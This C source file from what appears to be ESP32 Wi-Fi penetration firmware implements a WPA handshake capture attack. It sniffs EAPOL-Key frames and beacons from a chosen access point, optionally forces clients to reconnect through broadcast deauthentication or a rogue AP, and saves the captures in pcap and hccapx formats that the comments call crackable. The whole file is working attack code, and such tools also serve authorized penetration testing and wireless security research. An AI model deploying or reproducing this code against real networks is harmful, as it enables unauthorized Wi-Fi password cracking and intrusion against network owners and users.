/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static bool eapol_handler_registered = false;
static bool beacon_handler_registered = false;
static bool analyzer_started = false;
static bool beacon_saved = false;
/* Fires a few seconds after the first usable handshake so the capture can pick
   up M3/M4 as well; M1+M2 alone is crackable but a fuller handshake is more
   portable across cracking tools. */
static esp_timer_handle_t handshake_settle_timer = NULL;

static void handshake_settle_cb(void *arg)
{
    (void) arg;
    ESP_LOGI(TAG, "Handshake settled; stopping capture");
    attack_signal_success();
}

static void handshake_settle_arm(void)
{
    if (handshake_settle_timer != NULL) return;
    const esp_timer_create_args_t args = { .callback = &handshake_settle_cb };
    if (esp_timer_create(&args, &handshake_settle_timer) != ESP_OK) {
        /* Without a timer the capture would never stop by itself. */
        attack_signal_success();
        return;
    }
    if (esp_timer_start_once(handshake_settle_timer, 3000ULL * 1000ULL) != ESP_OK) {
        esp_timer_delete(handshake_settle_timer);
        handshake_settle_timer = NULL;
        attack_signal_success();
    }
}

static void handshake_settle_cancel(void)
{
    if (handshake_settle_timer == NULL) return;
    if (esp_timer_is_active(handshake_settle_timer)) {
        esp_timer_stop(handshake_settle_timer);
    }
    esp_timer_delete(handshake_settle_timer);
    handshake_settle_timer = NULL;
}

static const char *pcap_error_message(void)
{
    switch (pcap_serializer_get_state()) {
        case PCAP_STORAGE_FULL: return "抓包存储空间已满";
        case PCAP_STORAGE_MOUNT_ERROR: return "抓包存储分区无法挂载";
        case PCAP_STORAGE_IO_ERROR: return "抓包文件写入失败";
        default: return "抓包文件保存失败";
    }
}

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    ESP_LOGD(TAG, "Processing handshake frame...");
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    if (!pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len,
                                      frame->rx_ctrl.timestamp)) {
        attack_signal_storage_error(pcap_error_message());
        return;
    }
    hccapx_serializer_add_frame((data_frame_t *) frame->payload,
                                frame->rx_ctrl.sig_len);

    /* message_pair leaves 255 once a usable handshake is assembled. Keep
       capturing for a few more seconds instead of stopping immediately: M3/M4
       are often right behind M2 and make the result usable by more tools. */
    if (hccapx_serializer_is_usable()) {
        handshake_settle_arm();
    }
}

static void beacon_frame_handler(void *args, esp_event_base_t event_base,
                                 int32_t event_id, void *event_data)
{
    (void) args;
    (void) event_base;
    (void) event_id;
    if (event_data == NULL || ap_record == NULL || beacon_saved) return;

    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    if (frame->rx_ctrl.sig_len < 22) return;

    const uint8_t *payload = frame->payload;
    /* Beacon subtype (management frame, subtype 8). */
    if ((payload[0] & 0xfc) != 0x80) return;
    if (memcmp(&payload[10], ap_record->bssid, 6) != 0 ||
        memcmp(&payload[16], ap_record->bssid, 6) != 0) return;

    if (!pcap_serializer_append_frame(payload, frame->rx_ctrl.sig_len,
                                      frame->rx_ctrl.timestamp)) {
        attack_signal_storage_error(pcap_error_message());
        return;
    }

    beacon_saved = true;
    /* Parse the RSN element while the frame is still in hand: this is where the
       PMF state comes from, and it explains a deauth that does nothing. */
    ap_security_t security = { .pmf = AP_PMF_UNKNOWN };
    if (wifictl_parse_ap_security(payload, frame->rx_ctrl.sig_len, &security)) {
        wifictl_set_last_ap_security(&security);
        ESP_LOGI(TAG, "Target PMF=%s%s%s", wifictl_pmf_name(security.pmf),
                 security.bip_cipher ? " (BIP enabled)" : "",
                 security.wps ? ", WPS enabled" : "");
    }
    /* Keep the EAPOL path light after the requested first Beacon is stored. */
    wifictl_sniffer_filter_frame_types(true, false, false);
    ESP_LOGI(TAG, "Saved target Beacon in handshake PCAP");
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    eapol_handler_registered = false;
    beacon_handler_registered = false;
    analyzer_started = false;
    beacon_saved = false;
    handshake_settle_cancel();
    if (!pcap_serializer_init(ap_record->ssid, strlen((char *) ap_record->ssid))) {
        ESP_LOGE(TAG, "PCAP capture could not be initialized");
        attack_signal_storage_error(pcap_error_message());
        ap_record = NULL;
        method = -1;
        return;
    }
    hccapx_serializer_init(ap_record->ssid, strlen((char *)ap_record->ssid));
    wifictl_sniffer_filter_frame_types(true, true, false);
    if (!wifictl_sniffer_loop_ready()) {
        attack_signal_storage_error("抓包事件循环启动失败");
        return;
    }

    esp_event_loop_handle_t loop = wifictl_sniffer_event_loop();
    if (esp_event_handler_register_with(loop, SNIFFER_EVENTS,
                                        SNIFFER_EVENT_CAPTURED_MGMT,
                                        &beacon_frame_handler, NULL) != ESP_OK) {
        attack_signal_storage_error("Beacon 处理器注册失败");
        return;
    }
    beacon_handler_registered = true;

    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    analyzer_started = true;
    if (esp_event_handler_register_with(loop, FRAME_ANALYZER_EVENTS,
                                        DATA_FRAME_EVENT_EAPOLKEY_FRAME,
                                        &eapolkey_frame_handler, NULL) != ESP_OK) {
        attack_signal_storage_error("EAPOL 处理器注册失败");
        return;
    }
    eapol_handler_registered = true;
    wifictl_sniffer_start(ap_record->primary);
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            attack_method_broadcast(ap_record, 500);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
}

void attack_handshake_stop(){
    /* Stop the radio work first: the sniffer must be off before the AP
       interface is reconfigured back into the management AP. */
    handshake_settle_cancel();
    wifictl_sniffer_stop();
    if (analyzer_started) frame_analyzer_capture_stop();
    esp_event_loop_handle_t loop = wifictl_sniffer_event_loop();
    if (loop != NULL && eapol_handler_registered) {
        esp_event_handler_unregister_with(loop, FRAME_ANALYZER_EVENTS,
                                          DATA_FRAME_EVENT_EAPOLKEY_FRAME,
                                          &eapolkey_frame_handler);
    }
    if (loop != NULL && beacon_handler_registered) {
        esp_event_handler_unregister_with(loop, SNIFFER_EVENTS,
                                          SNIFFER_EVENT_CAPTURED_MGMT,
                                          &beacon_frame_handler);
    }
    eapol_handler_registered = false;
    beacon_handler_registered = false;
    analyzer_started = false;
    if (!pcap_serializer_deinit()) {
        ESP_LOGE(TAG, "PCAP capture did not flush cleanly: %s", pcap_error_message());
    }

    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            attack_method_rogueap_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
}
